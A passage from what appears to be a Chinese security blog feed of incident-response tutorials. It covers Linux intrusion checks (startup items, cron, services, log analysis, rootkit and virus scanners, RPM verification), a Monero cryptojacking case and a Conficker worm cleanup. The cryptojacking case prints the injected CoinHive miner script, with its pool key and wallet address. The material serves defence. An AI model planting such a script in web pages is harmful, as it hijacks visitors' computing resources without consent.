检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><div class="table-container"><table><thead><tr><th style="text-align:center">运行级别</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">关机</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">不完全的命令行模式，不含NFS服务</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">完全的命令行模式，就是标准字符界面</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">系统保留</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">图形模式</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">重启动</td></tr></tbody></table></div><p>查看运行级别命令 <code>runlevel</code></p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  #系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。</p><p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more <span class="string">/etc/rc.local</span></span><br><span class="line"><span class="string">/etc/rc.d/rc</span>[0~6]<span class="string">.d</span></span><br><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/rc.d/rc3.d/</span></span><br></pre></td></tr></table></figure><h4 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用 crontab 创建计划任务</p><ul><li><p>基本命令</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">Tips：默认编写的crontab文件会保存在 (<span class="keyword">/var/</span>spool<span class="keyword">/cron/</span>用户名 例如: <span class="keyword">/var/</span>spool<span class="keyword">/cron/</span>root</span><br><span class="line"></span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br><span class="line"></span><br><span class="line">如：*/<span class="number">1</span> * * * * echo <span class="string">&quot;hello world&quot;</span> &gt;&gt; <span class="keyword">/tmp/</span>test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure></li></ul><p>2、利用 anacron 命令实现异步定时任务调度</p><ul><li><p>使用案例</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每天运行 <span class="regexp">/home/</span>backup.sh 脚本：</span><br><span class="line">vi <span class="regexp">/etc/</span>anacrontab </span><br><span class="line"><span class="meta">@daily</span>    <span class="number">10</span>    example.daily   <span class="regexp">/bin/</span>bash <span class="regexp">/home/</span>backup.sh</span><br><span class="line">当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 <span class="number">7</span>天<span class="operator">。</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改 /etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM 包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep &quot;3:启用\|5:启用&quot;英文环境chkconfig --list | grep &quot;3:on\|5:on&quot;</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h4 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    可以使用find命令来查找，如  find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p><h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><div class="table-container"><table><thead><tr><th style="text-align:center">日志文件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">/var/log/cron</td><td style="text-align:center">记录了系统定时任务相关的日志</td></tr><tr><td style="text-align:center">/var/log/cups</td><td style="text-align:center">记录打印信息的日志</td></tr><tr><td style="text-align:center">/var/log/dmesg</td><td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td style="text-align:center">/var/log/mailog</td><td style="text-align:center">记录邮件信息</td></tr><tr><td style="text-align:center">/var/log/message</td><td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td style="text-align:center">/var/log/btmp</td><td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td style="text-align:center">/var/log/lastlog</td><td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td style="text-align:center">/var/log/wtmp</td><td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td style="text-align:center">/var/log/utmp</td><td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td style="text-align:center">/var/log/secure</td><td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table></div><p>日志分析技巧：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: <span class="attribute">name</span>=kali, <span class="attribute">GID</span>=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: <span class="attribute">name</span>=kali, <span class="attribute">UID</span>=1001, <span class="attribute">GID</span>=1001, <span class="attribute">home</span>=/home/kali</span><br><span class="line">, <span class="attribute">shell</span>=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali</span><br><span class="line"><span class="comment">#grep &quot;useradd&quot; /var/log/secure </span></span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete<span class="built_in"> user </span><span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line"><span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="keyword">for</span><span class="built_in"> user </span>good by root(<span class="attribute">uid</span>=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : <span class="attribute">TTY</span>=pts/4 ; <span class="attribute">PWD</span>=/home/good ; <span class="attribute">USER</span>=root ; <span class="attribute">COMMAND</span>=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul><li><p>chkrootkit  </p><p>网址：<a href="http://www.chkrootkit.org">http://www.chkrootkit.org</a> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp:<span class="regexp">//</span>ftp.pangeia.com.br<span class="regexp">/pub/</span>seg<span class="regexp">/pac/</span>chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-<span class="number">0.52</span></span><br><span class="line">make sense</span><br><span class="line"><span class="comment">#编译完成没有报错的话执行检查</span></span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net">http://rkhunter.sourceforge.net</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https:<span class="comment">//nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span></span><br><span class="line">tar -zxvf rkhunter-<span class="number">1.4</span>.<span class="number">4</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">cd rkhunter-<span class="number">1.4</span>.<span class="number">4</span></span><br><span class="line">./installer<span class="selector-class">.sh</span> <span class="attr">--install</span></span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a> </p><p>安装方式一： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装 zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> zlib-1.2.7</span><br><span class="line"><span class="comment">#安装一下gcc编译环境： yum install gcc</span></span><br><span class="line">CFLAGS=<span class="string">&quot;-O3 -fPIC&quot;</span> ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组 clamav 和组成员 clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c <span class="string">&quot;Clam AntiVirus&quot;</span> clamav</span><br><span class="line"></span><br><span class="line">3、安装 Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置 Clamav</span><br><span class="line"><span class="built_in">mkdir</span> /opt/clamav/logs</span><br><span class="line"><span class="built_in">mkdir</span> /opt/clamav/updata</span><br><span class="line"><span class="built_in">touch</span> /opt/clamav/logs/freshclam.log</span><br><span class="line"><span class="built_in">touch</span> /opt/clamav/logs/clamd.log</span><br><span class="line"><span class="built_in">cd</span> /opt/clamav/logs</span><br><span class="line"><span class="built_in">chown</span> clamav:clamav clamd.log</span><br><span class="line"><span class="built_in">chown</span> clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二： </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">yum install -y clamav</span><br><span class="line"><span class="comment">#更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"><span class="comment">#扫描方法</span></span><br><span class="line">clamscan -r <span class="string">/etc</span> <span class="params">--max-dir-recursion=5</span> -l <span class="string">/root/etcclamav.log</span></span><br><span class="line">clamscan -r <span class="string">/bin</span> <span class="params">--max-dir-recursion=5</span> -l <span class="string">/root/binclamav.log</span></span><br><span class="line">clamscan -r <span class="string">/usr</span> <span class="params">--max-dir-recursion=5</span> -l <span class="string">/root/usrclamav.log</span></span><br><span class="line"><span class="comment">#扫描并杀毒</span></span><br><span class="line">clamscan -r  <span class="params">--remove</span>  <span class="string">/usr/bin/bsd-port</span></span><br><span class="line">clamscan -r  <span class="params">--remove</span>  <span class="string">/usr/bin/</span></span><br><span class="line">clamscan -r <span class="params">--remove</span>  <span class="string">/usr/local/zabbix/sbin</span></span><br><span class="line"><span class="comment">#查看日志发现</span></span><br><span class="line">cat <span class="string">/root/usrclamav.log</span> |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>Linux 版：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">河马 WebShell 查杀：http<span class="punctuation">:</span><span class="comment">//www.shellpub.com</span></span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-check-检查"><a href="#2-4-RPM-check-检查" class="headerlink" title="2.4 RPM check 检查"></a>2.4 RPM check 检查</h4><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm <span class="punctuation">-</span>Va &gt; rpm.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的<span class="number">8</span>个信息的具体内容如下：</span><br><span class="line">S         文件大小是否改变</span><br><span class="line">M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line"><span class="number">5</span>         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">D         设备中，从代码是否改变</span><br><span class="line">L         文件路径是否改变</span><br><span class="line">U         文件的属主（所有者）是否改变</span><br><span class="line"><span class="selector-tag">G</span>         文件的属组是否改变</span><br><span class="line">T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询 <span class="built_in">ls</span> 命令属于哪个软件包</span><br><span class="line"><span class="built_in">mv</span>  /bin/ls /tmp  先把 <span class="built_in">ls</span> 转移到 tmp 目录下，造成 <span class="built_in">ls</span> 命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 <span class="built_in">ls</span> 命令到当前目录的 /bin/ls 下</span><br><span class="line"><span class="built_in">cp</span> /root/bin/ls  /bin/ 把 <span class="built_in">ls</span> 命令复制到 /bin/ 目录 修复文件丢失</span><br></pre></td></tr></table></figure><h4 id="2-5-Linux安全检查脚本"><a href="#2-5-Linux安全检查脚本" class="headerlink" title="2.5 Linux安全检查脚本"></a>2.5 Linux安全检查脚本</h4><p>Github 项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第06章：Web实战篇第2篇：门罗币恶意挖矿</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/3ed12ca6.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/3ed12ca6.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.055Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第2篇：门罗币恶意挖矿"><a href="#第2篇：门罗币恶意挖矿" class="headerlink" title="第2篇：门罗币恶意挖矿"></a>第2篇：门罗币恶意挖矿</h2><p>门罗币(Monero 或 XMR)，它是一个非常注重于隐私、匿名性和不可跟踪的加密数字货币。只需在网页中配置好js脚本，打开网页就可以挖矿，是一种非常简单的挖矿方式，而通过这种恶意挖矿获取数字货币是黑灰色产业获取收益的重要途径。</p><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>利用XMR恶意挖矿，会大量占用用户的CPU资源，严重影响了网站的用户体验。</p><p>从08/09日0点开始，局域网内某IP访问网站页面会触发安全预警，只要访问此服务器上的网页，CPU直线上升100%</p><p><img src="./image/2-5.jpg" alt=""></p><h3 id="问题解析"><a href="#问题解析" class="headerlink" title="问题解析"></a>问题解析</h3><p>通过获取恶意网页url，对网页页面进行分析，发现网站页面被植入在线门罗币挖矿代码：</p><p><code>&lt;script&gt;      var script = document.createElement(&#39;script&#39;);      script.onload = function () &#123;          // XMR Pool hash          var m = new CoinHive.Anonymous(&#39;BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu&#39;);         // TODO: Replace the below string with wallet string          m.start(&#39;47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK&#39;);      &#125;;      script.src = &#39;https://coinhive.com/lib/coinhive.min.js&#39;;      document.head.appendChild(script);  &lt;/script&gt;</code></p><p>删除js里面的恶意代码，网站被XMR 恶意挖矿，服务器已经被攻击，进一步做服务器入侵排查。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章：Windows实战篇第2篇：蠕虫病毒</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/f914641e.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/f914641e.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第2篇：蠕虫病毒"><a href="#第2篇：蠕虫病毒" class="headerlink" title="第2篇：蠕虫病毒"></a>第2篇：蠕虫病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    蠕虫病毒是一种十分古老的计算机病毒，它是一种自包含的程序（或是一套程序），通常通过网络途径传播，每入侵到一台新的计算机，它就在这台计算机上复制自己，并自动执行它自身的程序。</p><p>常见的蠕虫病毒：熊猫烧香病毒 、冲击波/震荡波病毒、conficker病毒等。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天早上，管理员在出口防火墙发现内网服务器不断向境外IP发起主动连接，内网环境，无法连通外网，无图脑补。</p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>在出口防火墙看到的服务器内网IP，首先将中病毒的主机从内网断开，然后登录该服务器，打开D盾_web查杀查看端口连接情况，可以发现本地向外网IP发起大量的主动连接：</p><p><img src="image/win-6-1.png" alt=""></p><p>通过端口异常，跟踪进程ID，可以找到该异常由svchost.exe windows服务主进程引起，svchost.exe向大量远程IP的445端口发送请求：</p><p><img src="image/win-6-2.png" alt=""></p><p>这里我们推测可以系统进程被病毒感染，使用卡巴斯基病毒查杀工具，对全盘文件进行查杀，发现c:\windows\system32\qntofmhz.dll异常：</p><p><img src="image/win-6-3.png" alt=""></p><p>使用多引擎在线病毒扫描（<a href="http://www.virscan.org/）">http://www.virscan.org/）</a> 对该文件进行扫描:</p><p><img src="image/win-6-4.png" alt=""></p><p>确认服务器感染conficker蠕虫病毒，下载conficker蠕虫专杀工具对服务器进行清查，成功清楚病毒。 </p><p><img src="image/win-6-5.png" alt=""></p><p>大致的处理流程如下:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、发现异常：出口防火墙、本地端口连接情况，主动向外网发起大量连接</span><br><span class="line">2、病毒查杀：卡巴斯基全盘扫描，发现异常文件</span><br><span class="line">3、确认病毒：使用多引擎在线病毒对该文件扫描，确认服务器感染conficker蠕虫病毒。</span><br><span class="line">4、病毒处理：使用conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。</span><br></pre></td></tr></table></figure><h3 id="0x04-预防处理措施"><a href="#0x04-预防处理措施" class="headerlink" title="0x04 预防处理措施"></a>0x04 <strong>预防处理措施</strong></h3><p>​    在政府、医院内网，依然存在着一些很古老的感染性病毒，如何保护电脑不受病毒感染，总结了几种预防措施：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、安装杀毒软件，定期全盘扫描</span><br><span class="line">2、不使用来历不明的软件，不随意接入未经查杀的U盘</span><br><span class="line">3、定期对windows系统漏洞进行修复，不给病毒可乘之机</span><br><span class="line">4、做好重要文件的备份，备份，备份。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux实战篇第2篇：捕捉短连接</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/5dfa7aec.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/5dfa7aec.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.049Z</updated>
    
